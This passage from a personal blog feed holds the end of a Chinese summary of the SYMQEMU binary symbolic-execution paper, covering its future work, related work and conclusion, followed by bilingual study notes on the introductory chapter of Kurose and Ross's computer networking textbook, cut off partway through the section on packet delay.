executions</h3><p>混合fuzzing技术的特点之一是能够对同一程序进行大量的连续执行。作为动态翻译器，SYMQEMU在运行态按需翻译target程序。并且翻译的结果在单个运行的过程之中被缓存，但是当目标程序执行终止时这些缓存结果会被丢弃。我们猜想，可以通过缓存多个执行过程中的翻译结果，可以显著提升结合SYMQEMU的混合FUZZ的性能。主要的挑战就是需要确定目标是确定性加载的，以及针对自我修改代码需要进行特殊处理。所以，这些潜在的优化性能提升主要在于被测程序的特点。</p><h3 id="symbolic-qemu-helpers">symbolic QEMU helpers</h3><p>QEMU利用TCG ops表示机器码，然而一些target的指令难以用TCGops来进行表示，尤其是在CISC架构之上。针对这情况，QEMU使用helpers:可以被TCG调用的内置变异函数，仿真target架构的每一个复杂指令。由于helpers工作在常规的TCG架构之外，SYMQEMU在TCG层级的插桩不能插入符号处理到他们之中。这样的结果是implicitconcretization，在分析使用大量目标的指令时会产生精读损失。</p><p>我们有如下两种实现qemu helpers符号处理的方式：</p><ol type="1"><li>第一种方式是为每一个要求的helper手动添加符号等价式，更像在一些符号执行引擎中使用的常用libc功能的函数总结。这个方式非常容易实现，但是不方便应用于大数量的helpers中。</li><li>另一种方式是自动化的实现helpers的符号化版本。为了实现这个目的，SYMCC可以被用来编译符号化追踪到helpers中，他的源代码作为QEMU的一部分是公开的。最终得到的二进制文件是和SYMQEMU兼容的，因为SYMCC的使用相同的符号推理的后端。S2E也是使用类似的方式编译helpers到KLEE中的解释器中的LLVMbitcode。</li></ol><h2 id="相关工作">相关工作</h2><h3 id="binary-only符号执行-1">binary-only符号执行</h3><p>Mayhem是一个高性能的基于解释器的符号执行系统，赢得过DAPRACGC比赛，然而由于其不开源无法比较性能。Triton是可以以两种方式运行的符号执行系统，一种使用二进制文件转换，类似于QSYM，一种使用CPU仿真，类似于S2E以及angr。Eclipser覆盖了介于fuzzing和符号执行之间的一些中间区域，他认为在分支条件和输入数据之间存在线性关系。这种约束的简化提升了系统的性能，然而他却不能发现常规符号执行系统可以发现的那些路径。Redqueen利用一种启发式的方法寻找路径条件和输入之间的关系。SYMQEMU相比较来说实现了全系统仿真。</p><h3 id="运行态bug检测">运行态bug检测</h3><p>混合fuzzing依靠fuzzer以及sanitizers来检测bugs。Addresssanitizer是一种流行的用来检测确定内存错误的sanitizer。由于其需要源代码来产生插桩程序，Fioraldi etal设计了QASan，基于qemu的系统来对二进制文件实现类似的检测。有大量的需要源代码的sanitizers。我们推测通过QASan的思路，可以将大量上述sanitizers用于二进制文件分析。</p><h3 id="混合fuzzing">混合fuzzing</h3><p>Driller是基于angr的混合fuzzer，其设计理念类似于QSYM，但是有其angr的python实现以及基于解释器的方式，其执行速度较低。与QSYM以及SYMQEMU比较，它使用了一种更加精细的策略来融合fuzzer以及符号引擎：他监控fuzzer的进展情况，并且当其似乎遇到自身无法解决的障碍时，会自动切换到符号执行。类似的，最近提出的Pangolin通过不仅提供fuzzer测试用例，以及一些抽象的符号约束，还有快速样本生成方法，强调了fuzzer结合符号执行的优势；利用这些，fuzzer能够生成可以有很大概率解决由符号执行生成的路径约束的输入。</p><p>我们认为更加精细的符号执行和fuzzer的组合可以很大程度上提升混合fuzzing的性能。</p><h2 id="总结">总结</h2><p>我们提出了SYMQEMU，一种基于编译的，针对二进制文件的符号执行引擎。我们的评价展示了SYMQEMU性能优于最先进的符号执行引擎并且可以在某些方面与基于源代码的符号执行技术相匹配。而且SYMQEMU非常方便的向其他架构进行迁移，只需要几行代码即可。</p>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Program Analysis</tag>
      
      <tag>Symbolic Execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计网学习笔记-Introduction</title>
    <link href="/2021/01/17/Computer-Network-Introduction/"/>
    <url>/2021/01/17/Computer-Network-Introduction/</url>
    
    <content type="html"><![CDATA[<h1 id="computer-networks-and-the-internet"><strong>Computer Networksand the Internet</strong></h1><blockquote><p>本文所有资料均来自 <em>Computer Networking: A Top-Down Approach</em><em>(8th ed.)</em><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[1]</span></a></sup> J.F.Kurose, K.W. Ross<br />You can find all the course materials related to this section <ahref="http://gaia.cs.umass.edu/kurose_ross/videos/1/"><strong>here</strong></a>.</p></blockquote><h2 id="overviewroadmap">Overview/roadmap</h2><ol type="1"><li>What <em>is</em> the Internet? What <em>is</em> a protocol?</li><li><strong>Network edge</strong>: hosts, access network, physicalmedia</li><li><strong>Network core</strong>: packet/circuit switching, internetstructure</li><li><strong>Performance</strong>: loss, delay, throughput</li><li>Protocol layers, service models</li><li>Security</li><li>History</li></ol><h2 id="chapter-goal">Chapter goal</h2><p>Get “feel,” “big picture,” introduction to terminology</p><ul><li>more depth, detail <em>later</em> in course</li></ul><p>在本章中，我们将概述所有章节并留待后续文章进行详细解释，同时我们需要知道下述问题：</p><ul><li>什么是计算机网络？</li><li>当我们谈论计算机网络时会想到什么？</li><li>是什么构成了计算机网络？</li><li>为什么会存在计算机网络？</li><li>什么是互联网？协议是什么？构成互联网的主要元素是什么？</li><li>我们在计算机网络中遇到什么问题，我们如何解决这些问题？</li></ul><p>我们将首先介绍计算机网络的基本概念。</p><h1 id="what-is-the-internet">1.1 What is <strong>theInternet</strong>?</h1><blockquote><p>Overview. What <em>is</em> the Internet? What <em>is</em> aprotocol?</p></blockquote><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/the-internet.gif" /></p><p>它是网络中的网络。 <strong>“network of networks”</strong></p><p>There are several ways to answer this question. First, we candescribe the basic hardware and software components that make up theInternet. Secondly, we can define the internet as a networkinfrastructure that provides services to distributed applications.</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/a-nuts-and-bolts-view.png"alt="nuts-and-bolts-view" /><figcaption aria-hidden="true">nuts-and-bolts-view</figcaption></figure><p>Let’s start with the basic building blocks of the internet.</p><h2 id="basic-building-blocks-of-the-internet">Basic building blocks ofthe Internet</h2><blockquote><p>The internet: a “nuts and bolts” view</p></blockquote><p><strong>Internet:</strong> “<strong>network of networks</strong>”(Again, this is really important.)</p><p>They connect to each other withISPs<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[2]</span></a></sup>.</p><blockquote><p><strong>What is ISP?</strong></p><p><strong>ISP</strong> is an acronym that stands for <em>InternetService Provider</em> . Internet Service Provider is a company thatprovides Internet access to organizations and home users. In short, anISP usually gives you Internet access for a fee. Without an ISP, youcannot shop online, access Facebook or read this page. Certaintelecommunications, networking and routing equipment is required toconnect to the Internet. ISPs allow users to establish an Internetconnection by allowing users to access networks containing the necessaryequipment.</p><p><strong>Can I connect to the Internet without an ISP?</strong></p><p>No, every end device needs an ISP to access the Internet. We willtalk about this in more detail in <strong>1.2 Network Devices</strong>section.</p></blockquote><p><strong>Protocols</strong> are everywhere.</p><ul><li>It controls the sending and receiving of messages.</li><li>Nedir bu protokoller; HTTP (Web), streaming video, Skype, TCP, IP,WiFi, 4G, Ethernet.</li></ul><p>Internet <strong>standards;</strong></p><ul><li><ahref="https://www.lifewire.com/what-is-internet-request-for-comments-rfc-4092366">RFC:Request for comments</a></li><li><ahref="https://en.wikipedia.org/wiki/Internet_Engineering_Task_Force">IETF:Internet engineering task force</a>(According to Xiao seniors ——disciple of the author of this book, they voted by the loudness of thehen, which I still can’t believe.)</li></ul><p>Why are these standards?</p><p>Working in line with the middle paths determined when working withcommunities by speaking a common language. kg, meters, etc.</p><h2 id="internet-services-overview">Internet services overview</h2><blockquote><p>The Internet: a “services” view</p></blockquote><p><strong>Internet:</strong> It is the <strong>infrastructure</strong>that serves the application.</p><p>Web, streaming video, multimedia teleconferencing, email, games,e-commerce, social media, inter-connected appliances, …</p><h2 id="what-is-the-protocol">What is the protocol?</h2><h3 id="a-human-protocols">a) Human protocols</h3><p>If we start from a protocol that we apply in daily life withoutrealizing it; <strong><code>Asking time protocol</code>!</strong></p><ul><li><code>A:</code> Hello</li><li><strong>B:</strong> <strong><em>Hello</em></strong></li><li><code>A:</code> What time is it?</li><li><strong>B:</strong> <strong><em>It’s 17:21</em></strong></li><li><code>A:</code> Thank you</li></ul><p>This is an example of a normal double talk (dialog).</p><p>If the other party does not receive your greetings, the conversationwill end, in case the other party does not speak English(Maybe youshould try Chinese at this time?); If it is a language you do not know,the communication will end, or if it is a language you know, theconversation will continue with that language.</p><p>In other words, according to the answers given by person B, ourcommunication will develop in another direction.</p><p>You can see the communication default used in this humancommunication.</p><h3 id="b-network-protocols">b) Network protocols</h3><blockquote><p>The only difference compared to the above example is that people arereplaced by computers.</p></blockquote><p>All communication activities on the Internet are managed byprotocols.</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/humans-and-computer-protocols.png"alt="humans-and-computer-protocols" /><figcaptionaria-hidden="true">humans-and-computer-protocols</figcaption></figure><blockquote><p>A <strong>protocol</strong> defines the <strong>format</strong> andthe <strong>order</strong> of messages exchanged between two or morecommunicating entities, as well as the <strong>actions taken</strong> onthe transmission and/or receipt of a message or other event.</p></blockquote><h1 id="network-devices">1.2 Network devices</h1><blockquote><p>The Network Edge</p></blockquote><p>Let’s take a closer look at the Internet structure ..</p><h2 id="a.-network-edge-edge-device">a. Network Edge (Edge device)</h2><p>We can consider any device that connects to the Internet as a<strong>network edge</strong>. What are these; computers, servers,mobile devices, cars, fridges ….</p><ul><li><p>hosts: clients and servers</p></li><li><p>servers often in data centers</p></li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Network-edge.png" /></p><h2 id="b.-access-networks-intermediate-devices-physical-media">b.Access networks (Intermediate devices), physical media</h2><p>They are intermediate devices that connect the units carrying thesepackages. These can be wired or wireless.</p><ul><li>wired, wireless communication links</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/access-networks.png" /></p><h2 id="c.-network-core-isp">c. Network Core ISP</h2><p>The units that logically or physically combine these above mentionedunits are also called ISP.</p><ul><li>Interconnected routers</li><li>Network of networks</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/the-network-core.png" /></p><h2 id="q-how-to-connect-end-systems-to-edge-router">Q: How to connectend systems to edge router?</h2><ul><li>In the first <strong><em>home scenario</em></strong> that comes tomind, the device you use is connected to an access point. Access pointconnects to ISP. The ISP may also be connecting to the server.<strong>“residential access net”</strong></li><li>Or you may be connecting through a <strong>public network</strong>at a <strong><em>coffee shop</em></strong>. <strong>“institutionalaccess networks (school, company)”</strong></li><li>Apart from these, you can connect <strong><em>directly</em></strong>with the phone’s <strong>4G / 5G</strong> or <strong>wifi</strong>.<strong>“mobile access networks (WiFi, 4G/5G)”</strong></li></ul><h2 id="access-networks-cable-based-access">Access networks: cable-basedaccess</h2><p>The first problem we encounter while accessing networks is to be ableto send the data of many devices connected to the network withoutcorruption.</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/cable-based-access.png" align="center" style="zoom: 80%;" /></p><p>We can use two different approaches to achieve this. These are<strong>FDM</strong> (Frequency Division Multiplexing) and<strong>TDM</strong>.</p><h3 id="fdm-frequency-division-multiplexing">FDM (Frequency DivisionMultiplexing)</h3><blockquote><p>frequency-dependent partitioning</p></blockquote><p>In this approach, we carry the data in a single cable at differentfrenx intervals. <strong>Pink Floyd</strong> ’s <ahref="https://www.youtube.com/watch?v=HW-lXjOyUWo&amp;list=PL3PhWT10BW3Urh8ZXXpuU9h526ChwgWKy&amp;index=1"><strong>thedark side of the moon</strong></a> colors stored in different frequencyranges within the album cover -Light prizması- in white light is a goodexample.</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/pink-floyd.png" style="zoom: 25%;" /></p><h3 id="tdm-time-division-multiplexing">TDM (Time DivisionMultiplexing)</h3><blockquote><p>time partitioning</p></blockquote><p>In this approach, the data is sent in a sequence, not divided intofrequency ranges.</p><p>First the data of <strong>device A</strong> is sent, then data of<strong>device B,</strong> and then <strong>device C</strong> …</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/TDM-and-FDM-example.png" alt="TDM-and-FDM-example" style="zoom:80%;" /></p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/TDM-and-FDM-example-2.png" alt="TDM-and-FDM-example-2" style="zoom:80%;" /></p><blockquote><p><strong>What is Topology?</strong></p><p>Topology deals with the properties of surfaces and shapes, but notlengths and angles. What he cares about is the properties of shapes thatdo not change when they are transformed into another shape. In topology,shapes can be pulled from all sides. Simply put, it is possible tocontinuously transform topological objects into another object withouttearing, cutting or tearing them, just by bending and bending them.</p><p>For example, computer networks (networks) are based on both physicaland logical topology. All terminals on the network are interconnected.The mapping of these interconnections is the physical topology, whilethe data flow determines the logical topology of the network. In otherwords, the physical topology specifies the physical design of thenetwork, while the logical topology specifies how the data is processedin the network independently.</p><p><strong>[<ahref="https://mail.ecomputernotes.com/computernetworkingnotes/computer-network/what-is-lan-topologies-explain-each-topology">Networktopologies]</a> -</strong> <em>Bus, star etc …</em></p></blockquote><p>There are certain devices that are used to prevent confusion of datasent from these different places.</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/shared-access-network.png"alt="shared access network" /><figcaption aria-hidden="true">shared access network</figcaption></figure><p>The houses shown in the example use a shared network and access theInternet in this way. <strong>(shared access network)</strong></p><ul><li>HFC: hybrid fiber coax<ul><li>asymmetric: up to 40 Mbps – 1.2 Gbs downstream transmission rate,30-100 Mbps upstream transmission rate</li></ul></li><li>network of cable, fiber attaches homes to ISP router<ul><li>homes <strong>share access network</strong> to cable headend</li></ul></li></ul><h2 id="access-networks-digital-subscriber-line-dsl">Access networks:digital subscriber line (DSL)</h2><p>According to the previous example, we have a <strong>subscriberline</strong> and, contrary to the previous example, we can think thateveryone has their own network, not a single network in theneighborhood. Of course, technically, these home networks, which will beconnected to the common cable in the neighborhood at the end of the day,are described as special services that ISPs provide to theircustomers.</p><blockquote><p>While there is a <strong>shared</strong> network in the previousexample, there is a cable <strong>assigned</strong> to the houses in theDSL example.</p></blockquote><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/dsl.png"alt="digital subscriber line" /><figcaption aria-hidden="true">digital subscriber line</figcaption></figure><ul><li>use <strong>existing</strong> telephone line to central office DSLAM<ul><li>data over DSL phone line goes to Internet</li><li>voice over DSL phone line goes to telephone net</li></ul></li><li>24-52 Mbps dedicated downstream transmission rate</li><li>3.5-16 Mbps dedicated upstream transmission rate</li></ul><h2 id="access-networks-home-networks">Access networks: homenetworks</h2><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/home-networks.png" alt="Access networks: home networks" style="zoom:80%;" /></p><h2 id="wireless-access-networks">Wireless access networks</h2><p>Shared <em>wireless</em> access network connects end system torouter</p><ul><li>via base station aka “access point”</li></ul><h3 id="wireless-local-area-networks-wlans">Wireless local area networks(WLANs)</h3><ul><li>typically within or around building (~100 ft)</li><li>802.11b/g/n (WiFi): 11, 54, 450 Mbps transmission rate</li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/wlans.png"alt="WLANs" /><figcaption aria-hidden="true">WLANs</figcaption></figure><h3 id="wide-area-cellular-access-networks">Wide-area cellular accessnetworks</h3><ul><li>provided by mobile, cellular network operator (10’s km)</li><li>10’s Mbps</li><li>4G cellular networks (5G coming)</li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/cellular.png"alt="cellular" /><figcaption aria-hidden="true">cellular</figcaption></figure><h2 id="access-networks-enterprise-networks">Access networks: enterprisenetworks</h2><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/enterprise-networks.png"alt="enterprise networks" /><figcaption aria-hidden="true">enterprise networks</figcaption></figure><ul><li>companies, universities, etc.</li><li>mix of wired, wireless link technologies, connecting a mix ofswitches and routers (we’ll cover differences shortly)<ul><li>Ethernet: wired access at 100Mbps, 1Gbps, 10Gbps</li><li>WiFi: wireless access points at 11, 54, 450 Mbps</li></ul></li></ul><h2 id="access-networks-data-center-networks">Access networks: datacenter networks</h2><ul><li>high-bandwidth links (10s to 100s Gbps) connect hundreds tothousands of servers together, and to Internet</li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Computing-Center.png"alt="Courtesy: Massachusetts Green High Performance Computing Center" /><figcaption aria-hidden="true">Courtesy: Massachusetts Green HighPerformance Computing Center</figcaption></figure><h2 id="host-sends-packets-of-data">Host: sends <em>packets</em> ofdata</h2><p>host sending function:</p><ul><li>takes application message</li><li>breaks into smaller chunks, known as <strong>packets</strong>, oflength <strong>L</strong> bits</li><li>transmits packet into access network at <strong>transmission rateR</strong><ul><li>link transmission rate, aka link <strong>capacity, aka linkbandwidth</strong></li></ul></li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Host.png"alt="Host" /><figcaption aria-hidden="true">Host</figcaption></figure><p>We talked about how data was sent from a host. This time, we’re goingto tackle an engineering problem.<strong>Data Delay</strong></p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/packets.png"alt="packet-delay" /><figcaption aria-hidden="true">packet-delay</figcaption></figure><h2 id="data-delay">Data delay</h2><p>Data lag is the most common problem we will face in data transfer.Our connection may slow down (lag) while playing games, packets may bedelayed while watching live broadcast …</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/delay-packge.png" style="zoom: 33%;" /></p><p>Or, if data comes from different sources, we need to list it at itsdestination. We need to adjust these delays for service quality.</p><p><strong><em>So why are these delays caused?</em></strong></p><p>Simply put, you have L bits of data to transmit, but you can onlytransmit R bits of data per second.</p><p><span class="math display">$$\text {packet transmission delay} =\frac{L \text { (bits)}}{R \text { (bits/sec)}}$$</span></p><p><strong>L</strong> = package size</p><p><strong>R</strong> = link transmission rate</p><h2 id="links-physical-media">Links: Physical media</h2><p>Followed by the person who installed the broadband watch a few moretimes to understand.</p><ul><li><strong>bit</strong>: propagates between transmitter/receiverpairs</li><li><strong>physical link</strong>: what lies between transmitter &amp;receiver</li><li><strong>guided media</strong>:<ul><li>signals propagate in solid media: copper, fiber, coax</li></ul></li><li><strong>unguided media</strong>:<ul><li>signals propagate freely, e.g., radio</li></ul></li></ul><h3 id="twisted-pair-tp">Twisted pair (TP)</h3><p>Two insulated copper wires</p><ul><li><strong>Category 5</strong>: 100 Mbps, 1 Gbps Ethernet</li><li><strong>Category 6</strong>: 10Gbps Ethernet</li></ul><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Twisted-pair.png" style="zoom: 67%;" /></p><h3 id="coaxial-cable">Coaxial cable</h3><ul><li>two concentric copper conductors</li><li>bidirectional</li><li>broadband:<ul><li>multiple frequency channels on cable</li><li>100’s Mbps per channel</li></ul></li></ul><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Coaxial-cable.png" style="zoom: 33%;" /></p><h2 id="fiber-optic-cable">Fiber optic cable</h2><p><a href="https://www.youtube.com/watch?v=0MwMkBET_5I"><em>How dofiber optic cables work?</em></a></p><ul><li>glass fiber carrying light pulses, each pulse a bit</li><li>high-speed operation:<ul><li>high-speed point-to-point transmission (10’s-100’s Gbps)</li></ul></li><li>low error rate:<ul><li>repeaters spaced far apart</li><li>immune to electromagnetic noise</li></ul></li></ul><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Fiber-optic-cable.png" style="zoom: 33%;" /></p><h3 id="wireless-radio">Wireless radio</h3><ul><li>signal carried in various “bands” in electromagnetic spectrum</li><li>no physical “wire”</li><li>broadcast, “half-duplex” (sender to receiver)</li><li>propagation environment effects:<ul><li>reflection</li><li>obstruction by objects</li><li>Interference/noise</li></ul></li></ul><h3 id="radio-link-types">Radio link types</h3><ul><li><strong>Wireless LAN</strong> (WiFi)<ul><li>10-100’s Mbps; 10’s of meters</li></ul></li><li><strong>wide-area</strong> (e.g., 4G cellular)<ul><li>10’s Mbps over ~10 Km</li></ul></li><li><strong>Bluetooth</strong>: cable replacement<ul><li><strong>short distances, limited rates</strong></li></ul></li><li><strong>terrestrial microwave</strong><ul><li>point-to-point; 45 Mbps channels</li></ul></li><li><strong>satellite</strong><ul><li>up to 45 Mbps per channel</li><li>270 msec end-end delay</li></ul></li></ul><h1 id="foundation-of-the-network">1.3 Foundation of the network</h1><blockquote><p>The Network Core</p></blockquote><p>Network of interconnected routers.</p><p>There are devices that we call <strong>routers</strong> and<strong>switches</strong> that support end devices . These devices carryout an event called packet switch. They pick up the package from oneplace, key it and forward it to another location.</p><p>We have two basic functions in Network Core:<strong>Forwarding</strong> and <strong>Routing.</strong></p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/key_network_core.png"alt="Two key network-core functions" /><figcaption aria-hidden="true">Two key network-corefunctions</figcaption></figure><h2 id="forwarding"><strong>Forwarding</strong></h2><p><strong>Forwarding</strong> the package never occurs without atransfer destination of a packet can be explained as the transmissionsource point. Also known as <strong>switching</strong> .(<strong>Localaction</strong>)</p><blockquote><p>move arriving packets from router’s input link to appropriate routeroutput link</p></blockquote><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Forwarding.png" /></p><h2 id="routing"><strong>Routing</strong></h2><p><strong>Routing</strong> , on the other hand, takes a package fromthe source point and transports it to the destination point, while thispackage changes hands between other carriers.(<strong>Globalaction</strong>) Determine the direction.</p><blockquote><p>determine source-destination paths taken by packets</p></blockquote><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Routing.png" /></p><h2 id="packet-switching-store-and-forward">Packet-switching:store-and-forward</h2><p><strong>Why are packages stored? (Delays in packettransmission)</strong></p><ul><li>It may be unknown where the package will go.</li><li>Other packages may be expected.</li><li>There are packages that have to be sent before.</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/store-and-forward.png" /></p><h2 id="packet-switching-queueing">Packet-switching: queueing</h2><p>Occurs when demand exceeds the queue service capacity.</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/tea-queueing.jpg" style="zoom: 50%;" /></p><p>Should the <strong>packet loss</strong> be considered first in thepacket forwarding queue? Here comes the problem.</p><ul><li>What should be done in case of package loss?</li><li>How do we make the tail efficient?</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/queueing.png" /></p><p><strong>Packet queuing and loss:</strong> if arrival rate (in bps) tolink exceeds transmission rate (bps) of link for some period oftime:</p><ul><li>packets will queue, waiting to be transmitted on output link</li><li>packets can be dropped (lost) if memory (buffer) in router fillsup</li></ul><h2 id="alternative-to-packet-switching-circuit-switching">Alternativeto packet switching: Circuit Switching</h2><p>It is a channel only available to you between you and the target.Wecan compare this to military phone lines. Only interconnected phones tocommunicate between two fronts.</p><blockquote><p><strong>We can think of circuit switching as creating a directchannel between two end devices.</strong></p><p><strong>The biggest difference between circuit switching and packetswitching is that circuit users can’t share bandwidth.</strong></p></blockquote><p>end-end resources allocated to, reserved for “call” between sourceand destination</p><ul><li>in diagram, each link has four circuits.<ul><li>call gets 2nd circuit in top link and 1st circuit in rightlink.</li></ul></li><li>dedicated resources: no sharing<ul><li>circuit-like (guaranteed) performance</li></ul></li><li>circuit segment idle if not used by call (<strong>nosharing</strong>)</li><li>commonly used in traditional telephone networks</li></ul><h3 id="packet-switching-vs-circuit-switching">Packet switching vsCircuit switching</h3><h3 id="packet-switching">Packet Switching</h3><ul><li>Shared channel usage. (More intensive use!)</li><li>It can serve more users. Used more widely</li><li>It can serve approximately 35 users at a bandwidth of 1 Gbps.</li></ul><h3 id="circut-switching">Circut Switching</h3><ul><li>Dedicated channel usage</li><li>It is a less preferred method because it is more costly.</li><li>It can serve up to 10 users at a bandwidth of 1 Gbps.</li></ul><p>Packet Switching requires a lot of management and planning, as wellas overcoming packet loss problems caused by queue overflows inexcessive packet transfer.We will examine problems such as transmissionproblems and congestion studies during the period and look at how tosolve these problems.</p><h2 id="internet-structure-a-network-of-networks">Internet structure: a“network of networks”</h2><p><strong><em>Question:</em> given millions of access ISPs, how toconnect them together?</strong></p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network1.png" style="zoom:67%;" /></p><p>Trying to connect all ISPs together is not a connection that canscale: O(<span class="math inline"><em>N</em><sup>2</sup></span>)connections. So how do we go about it?</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network2.png" style="zoom:67%;" /></p><p>Instead of connecting these many ISPs to one, we can connect to aglobal ISP and obtain a scalable connection.</p><p><em>Customer</em> <em>and</em> <em>provider</em> <em>ISPs haveeconomic agreement.</em></p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network3.png" style="zoom:67%;" /></p><p>Of course, since this universal ISP business would be a reasonablebusiness type, there will be other Universal ISPs providing thisservice.</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network4.png" style="zoom:67%;" /></p><p>We use intercontinental high-speed routers that we call IXP (InterneteXchange Point) when connecting these universal ISPs.</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network5.png" style="zoom:67%;" /></p><p>Although not as large as Universal ISPs, there are also Regional ISPsthat work with the same logic.</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network6.png" style="zoom:67%;" /></p><p>Also content provider networks. They can use their private networks -like Google, Microsoft - to bring services and content closer to endusers. In this way, they get rid of the density in ISPs.</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network7.png" style="zoom:67%;" /></p><p>At “center”: small # of well-connected large networks</p><ul><li>“tier-1” commercial ISPs (e.g., Level 3, Sprint, AT&amp;T, NTT),national &amp; international coverage</li><li>content provider networks (e.g., Google, Facebook): private networkthat connects its data centers to Internet, often bypassing tier-1,regional ISPs</li></ul><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/network8.png" style="zoom:67%;" /></p><h1 id="performance">1.4 Performance</h1><blockquote><p>Performance: loss, delay, throughput</p></blockquote><p>In this chapter;</p><ul><li>What are the things that affect the performance of a network?</li><li>How do we measure the performance of a network?</li></ul><p>We will look for answers to questions like.</p><h2 id="packet-delay-four-sources">Packet delay: four sources</h2><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/计网学习笔记-Introduction/Packet-delay.png" /></p><ul><li><strong>Processing Delay</strong>: The time required to examine thepacket header and determine where the packet will be forwarded.Processing Delay can also be caused by other factors such as<strong>checking for bit-level errors</strong>. This processing delay isin microseconds or less on high-end routers. After this nodalprocessing, the package is queued to go to the other router. In chapter4 we will go into details on how routers work.</li><li><strong>Queuing Delay</strong> : The delay in which a package thatis in the last row of the queue goes through its turn. The length ofthis queue delay varies depending on the number of packets queued andwaiting to be transmitted.</li><li><strong>Transmission Delay</strong>: The amount of time it takes forthe router to understand where to 